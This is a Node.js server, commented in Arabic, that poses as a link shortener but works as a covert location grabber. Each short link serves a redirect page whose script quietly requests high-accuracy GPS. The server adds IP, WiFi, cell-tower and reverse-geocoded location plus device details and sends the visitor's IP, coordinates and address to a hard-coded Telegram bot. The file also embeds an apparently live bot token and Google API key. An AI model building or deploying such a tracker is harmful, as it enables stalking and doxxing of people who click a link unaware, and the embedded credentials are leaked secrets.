const express = require('express');
const axios = require('axios');
const crypto = require('crypto');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));

const TELEGRAM_BOT_TOKEN = '8658060797:AAFrQcyzuClg3qiOU2wGAqYqjTMEqFI1yIU';
const TELEGRAM_CHAT_ID = '5942654805';

const linkStorage = {};

function generateShortCode() {
  return crypto.randomBytes(4).toString('hex');
}

// ===== الـ 6 METHODS =====

// Method 1: Browser GPS
function parseGPS(gpsData) {
  if (!gpsData || !gpsData.latitude || !gpsData.longitude) return null;
  return {
    method: '📍 Browser GPS (High Accuracy)',
    latitude: parseFloat(gpsData.latitude).toFixed(6),
    longitude: parseFloat(gpsData.longitude).toFixed(6),
    accuracy: `±${(gpsData.accuracy || 20).toFixed(0)}m`,
    altitude: gpsData.altitude ? `${parseFloat(gpsData.altitude).toFixed(0)}m` : 'N/A',
    heading: gpsData.heading !== null ? `${parseFloat(gpsData.heading).toFixed(0)}°` : 'N/A',
    speed: gpsData.speed !== null ? `${(gpsData.speed * 3.6).toFixed(0)} km/h` : 'N/A',
    timestamp: new Date(gpsData.timestamp).toLocaleString('ar-SA')
  };
}

// Method 2: IP Geolocation (Triple check)
async function getIPLocation(ip) {
  const attempts = [
    () => axios.get(`http://ip-api.com/json/${ip}?lang=ar`, { timeout: 2000 }),
    () => axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 }),
    () => axios.get(`https://geolocation-db.com/json/${ip}`, { timeout: 2000 })
  ];

  for (let attempt of attempts) {
    try {
      const res = await attempt();
      const data = res.data;
      if (data.latitude && data.longitude) {
        return {
          method: '🌐 IP Geolocation',
          country: data.country || data.country_name || 'Unknown',
          city: data.city || 'N/A',
          latitude: parseFloat(data.latitude || data.lat).toFixed(6),
          longitude: parseFloat(data.longitude || data.lon).toFixed(6),
          accuracy: '±50-100km',
          isp: data.isp || data.org || 'Unknown',
          timezone: data.timezone || 'N/A'
        };
      }
    } catch (e) {}
  }
  return null;
}

// Method 3: WiFi Triangulation (Google Geolocation API)
async function getWiFiLocation(wifiData) {
  if (!wifiData || wifiData.length === 0) return null;
  
  try {
    const payload = {
      wifiAccessPoints: wifiData.map(w => ({
        macAddress: w.bssid || w.ssid,
        signalStrength: w.level || -50,
        signalToNoiseRatio: w.snr || 0
      }))
    };

    const res = await axios.post(
      'https://www.googleapis.com/geolocation/v1/geolocate?key=AIzaSyAJT6OiVBLUw-bPv6yqzHKjVx9dPy_pVIM',
      payload,
      { timeout: 3000 }
    );

    if (res.data && res.data.location) {
      return {
        method: '📶 WiFi Triangulation (Google)',
        latitude: res.data.location.lat.toFixed(6),
        longitude: res.data.location.lng.toFixed(6),
        accuracy: `±${res.data.accuracy.toFixed(0)}m`,
        networks_detected: wifiData.length
      };
    }
  } catch (e) {}
  return null;
}

// Method 4: Cell Tower Triangulation
async function getCellLocation(cellData, ip) {
  if (!cellData) {
    // Fallback to IP
    try {
      const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
      if (res.data && res.data.latitude) {
        return {
          method: '📡 Cell Tower (IP Fallback)',
          country: res.data.country_name || 'Unknown',
          city: res.data.city || 'N/A',
          latitude: res.data.latitude.toFixed(6),
          longitude: res.data.longitude.toFixed(6),
          accuracy: '±500m-2km',
          org: res.data.org || 'Unknown'
        };
      }
    } catch (e) {}
    return null;
  }

  return {
    method: '📡 Cell Tower',
    latitude: cellData.latitude?.toFixed(6) || 'N/A',
    longitude: cellData.longitude?.toFixed(6) || 'N/A',
    accuracy: cellData.accuracy ? `±${cellData.accuracy}m` : '±500m-2km',
    mcc: cellData.mcc || 'N/A',
    mnc: cellData.mnc || 'N/A'
  };
}

// Method 5: Device + Timezone Detection
async function getDeviceInfo(userAgent, ip) {
  let timezone = 'Unknown';
  
  try {
    const res = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
    timezone = res.data.timezone || 'Unknown';
  } catch (e) {}

  const parser = parseUserAgent(userAgent);
  
  return {
    method: '🖥️ Device Detection',
    device: parser.device,
    os: parser.os,
    browser: parser.browser,
    timezone: timezone,
    language: 'Arabic',
    screen_info: 'Mobile Compatible'
  };
}

function parseUserAgent(ua) {
  let device = 'Desktop', os = 'Unknown', browser = 'Unknown';

  if (/android/i.test(ua)) device = 'Android';
  else if (/iphone|ipad/i.test(ua)) device = 'iOS';
  else if (/windows/i.test(ua)) os = 'Windows';
  else if (/mac/i.test(ua)) os = 'macOS';
  else if (/linux/i.test(ua)) os = 'Linux';

  if (/chrome/i.test(ua)) browser = 'Chrome';
  else if (/firefox/i.test(ua)) browser = 'Firefox';
  else if (/safari/i.test(ua)) browser = 'Safari';
  else if (/edge/i.test(ua)) browser = 'Edge';

  return { device, os, browser };
}

// Method 6: Reverse Geocoding (احصل على الدولة والمدينة من lat/lng)
async function reverseGeocode(lat, lng) {
  try {
    const res = await axios.get(
      `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`,
      { 
        timeout: 2000,
        headers: { 'User-Agent': 'LinkShortener/1.0' }
      }
    );

    if (res.data && res.data.address) {
      const addr = res.data.address;
      return {
        method: '🗺️ Reverse Geocoding (Nominatim)',
        country: addr.country || 'Unknown',
        city: addr.city || addr.town || addr.village || 'Unknown',
        postal_code: addr.postcode || 'N/A',
        address: res.data.name || 'N/A'
      };
    }
  } catch (e) {}
  return null;
}

// Main Telegram Sender
async function sendAllMethodsToTelegram(ip, shortCode, originalUrl, userAgent, allMethods) {
  try {
    let msg = `
🔗 <b>رابط فُتح!</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>📌 الكود:</b> <code>${shortCode}</code>
<b>🌐 الرابط:</b> ${originalUrl}
<b>🔌 IP:</b> <code>${ip}</code>
<b>⏰ الوقت:</b> ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━━━━━━━━━━

`;

    // Method 1: GPS
    if (allMethods.gps) {
      msg += `<b>✅ [1] ${allMethods.gps.method}</b>
📍 <code>${allMethods.gps.latitude}, ${allMethods.gps.longitude}</code>
📏 دقة: ${allMethods.gps.accuracy}
⛰️ ارتفاع: ${allMethods.gps.altitude}
🧭 اتجاه: ${allMethods.gps.heading}
🚀 سرعة: ${allMethods.gps.speed}
🗺️ <a href="https://maps.google.com/?q=${allMethods.gps.latitude},${allMethods.gps.longitude}">Google Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
    } else {
      msg += `<b>❌ [1] Browser GPS</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }

    // Method 2: IP Geolocation
    if (allMethods.ip) {
      msg += `<b>✅ [2] ${allMethods.ip.method}</b>
🏳️ الدولة: ${allMethods.ip.country}
🏙️ المدينة: ${allMethods.ip.city}
📍 <code>${allMethods.ip.latitude}, ${allMethods.ip.longitude}</code>
📏 دقة: ${allMethods.ip.accuracy}
🏢 ISP: <code>${allMethods.ip.isp}</code>
⏱️ التوقيت: ${allMethods.ip.timezone}
🗺️ <a href="https://maps.google.com/?q=${allMethods.ip.latitude},${allMethods.ip.longitude}">Google Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
    } else {
      msg += `<b>❌ [2] IP Geolocation</b> - فشل\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }

    // Method 3: WiFi
    if (allMethods.wifi) {
      msg += `<b>✅ [3] ${allMethods.wifi.method}</b>
📍 <code>${allMethods.wifi.latitude}, ${allMethods.wifi.longitude}</code>
📏 دقة: ${allMethods.wifi.accuracy}
📶 شبكات مكتشفة: ${allMethods.wifi.networks_detected}
🗺️ <a href="https://maps.google.com/?q=${allMethods.wifi.latitude},${allMethods.wifi.longitude}">Google Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
    } else {
      msg += `<b>❌ [3] WiFi Triangulation</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }

    // Method 4: Cell Tower
    if (allMethods.cell) {
      msg += `<b>✅ [4] ${allMethods.cell.method}</b>
📍 <code>${allMethods.cell.latitude}, ${allMethods.cell.longitude}</code>
📏 دقة: ${allMethods.cell.accuracy}
📡 MCC: ${allMethods.cell.mcc} | MNC: ${allMethods.cell.mnc}
🗺️ <a href="https://maps.google.com/?q=${allMethods.cell.latitude},${allMethods.cell.longitude}">Google Maps</a>
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
    } else {
      msg += `<b>❌ [4] Cell Tower</b> - غير متاح\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }

    // Method 5: Device Info
    if (allMethods.device) {
      msg += `<b>✅ [5] ${allMethods.device.method}</b>
📱 جهاز: ${allMethods.device.device}
🖥️ نظام: ${allMethods.device.os}
🌐 متصفح: ${allMethods.device.browser}
🗓️ التوقيت: ${allMethods.device.timezone}
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
    }

    // Method 6: Reverse Geocoding
    if (allMethods.reverse) {
      msg += `<b>✅ [6] ${allMethods.reverse.method}</b>
🏳️ الدولة: ${allMethods.reverse.country}
🏙️ المدينة: ${allMethods.reverse.city}
📮 الرمز البريدي: ${allMethods.reverse.postal_code}
📍 العنوان: ${allMethods.reverse.address}
━━━━━━━━━━━━━━━━━━━━━━━━━

`;
    } else {
      msg += `<b>❌ [6] Reverse Geocoding</b> - فشل\n━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;
    }

    msg += `<b>📊 الملخص:</b>
أفضل دقة: ${allMethods.gps ? '📍 GPS' : (allMethods.wifi ? '📶 WiFi' : (allMethods.ip ? '🌐 IP' : 'غير متاح'))}
🖥️ User Agent: <code>${userAgent.substring(0, 60)}</code>
    `.trim();

    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      { 
        chat_id: TELEGRAM_CHAT_ID, 
        text: msg,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      },
      { timeout: 5000 }
    );

    console.log('✅ [TG] All methods sent');
    return true;
  } catch (err) {
    console.error('❌ [TG]', err.message);
    return false;
  }
}

// API: اجمع كل البيانات من الـ browser
app.post('/api/log-all', async (req, res) => {
  const { code, gps, wifi, cell } = req.body;
  
  if (!linkStorage[code]) {
    return res.status(404).json({ error: 'Not found' });
  }

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
  const userAgent = req.get('user-agent');
  const originalUrl = linkStorage[code].original;

  linkStorage[code].clicks++;

  console.log(`[LOG] ${code} | IP: ${ip}`);

  // جمع البيانات من جميع الطرق
  const allMethods = {
    gps: null,
    ip: null,
    wifi: null,
    cell: null,
    device: null,
    reverse: null
  };

  // شغل جميع الطرق متوازي
  const promises = [
    // Method 1: GPS
    Promise.resolve(gps ? parseGPS(gps) : null).then(r => { allMethods.gps = r; }),

    // Method 2: IP
    getIPLocation(ip).then(r => { allMethods.ip = r; }),

    // Method 3: WiFi
    wifi ? getWiFiLocation(wifi).then(r => { allMethods.wifi = r; }) : Promise.resolve(),

    // Method 4: Cell
    getCellLocation(cell, ip).then(r => { allMethods.cell = r; }),

    // Method 5: Device Info
    getDeviceInfo(userAgent, ip).then(r => { allMethods.device = r; }),

    // Method 6: Reverse Geocoding (من أفضل موقع)
    (async () => {
      if (gps && gps.latitude && gps.longitude) {
        allMethods.reverse = await reverseGeocode(gps.latitude, gps.longitude);
      } else if (allMethods.ip) {
        allMethods.reverse = await reverseGeocode(allMethods.ip.latitude, allMethods.ip.longitude);
      }
    })()
  ];

  await Promise.all(promises);

  // أرسل للـ Telegram
  await sendAllMethodsToTelegram(ip, code, originalUrl, userAgent, allMethods);

  res.json({ ok: true });
});

app.post('/api/shorten', (req, res) => {
  const { url } = req.body;
  if (!url) return res.status(400).json({ error: 'URL required' });

  const shortCode = generateShortCode();
  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0 };

  res.json({ 
    shortened: `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`, 
    code: shortCode 
  });
});

// ===== REDIRECT المباشر =====
app.get('/:code', (req, res) => {
  const { code } = req.params;
  
  if (!linkStorage[code]) {
    return res.status(404).send('Not found');
  }

  const originalUrl = linkStorage[code].original;

  // شغل جمع البيانات في الخلفية بدون انتظار
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
</head>
<body>
  <script>
    const code = '${code}';
    const apiUrl = '${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/api/log-all';
    const originalUrl = '${originalUrl.replace(/'/g, "\\'")}';
    
    // Redirect مباشر
    window.location.href = originalUrl;
    
    // جمع البيانات في الخلفية
    setTimeout(async () => {
      const data = { code };
      
      // GPS
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            data.gps = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              heading: pos.coords.heading,
              speed: pos.coords.speed,
              timestamp: Date.now()
            };
            sendData();
          },
          () => sendData(),
          { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }
        );
      } else {
        sendData();
      }
      
      function sendData() {
        fetch(apiUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data),
          keepalive: true
        }).catch(() => {
          // Fallback: sendBeacon
          navigator.sendBeacon(apiUrl, JSON.stringify(data));
        });
      }
    }, 50);
  </script>
</body>
</html>
  `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server on ${PORT} - 6 Methods Active`);
});